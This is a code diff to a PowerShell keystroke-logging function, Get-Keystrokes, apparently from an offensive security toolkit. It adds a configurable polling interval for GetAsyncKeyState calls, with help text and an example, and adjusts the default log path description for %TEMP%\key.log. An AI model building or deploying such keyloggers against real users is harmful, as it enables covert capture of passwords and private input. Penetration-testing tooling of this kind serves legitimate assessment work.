@@ -12,11 +12,15 @@ function Get-Keystrokes {
     
 .PARAMETER LogPath
 
-    Specifies the path where pressed key details will be logged. By default, keystrokes are logged to '$($Env:TEMP)\key.log'.
+    Specifies the path where pressed key details will be logged. By default, keystrokes are logged to %TEMP%\key.log.
 
 .PARAMETER CollectionInterval
 
     Specifies the interval in minutes to capture keystrokes. By default, keystrokes are captured indefinitely.
+
+.PARAMETER PollingInterval
+
+    Specifies the time in milliseconds to wait between calls to GetAsyncKeyState. Defaults to 40 milliseconds.
 
 .EXAMPLE
 
@@ -25,6 +29,10 @@ function Get-Keystrokes {
 .EXAMPLE
 
     Get-Keystrokes -CollectionInterval 20
+
+.EXAMPLE
+
+    Get-Keystrokes -PollingInterval 35
 
 .LINK
 
@@ -39,7 +47,11 @@ function Get-Keystrokes {
 
         [Parameter(Position = 1)]
         [UInt32]
-        $CollectionInterval
+        $CollectionInterval,
+
+        [Parameter(Position = 2)]
+        [Int32]
+        $PollingInterval = 40
     )
 
     $LogPath = Join-Path (Resolve-Path (Split-Path -Parent $LogPath)) (Split-Path -Leaf $LogPath)
@@ -139,7 +151,7 @@ function Get-Keystrokes {
                 $ImportDll = $TypeBuilder.CreateType()
             }
 
-            Start-Sleep -Milliseconds 40
+            Start-Sleep -Milliseconds $PollingInterval
 
                 try
                 {
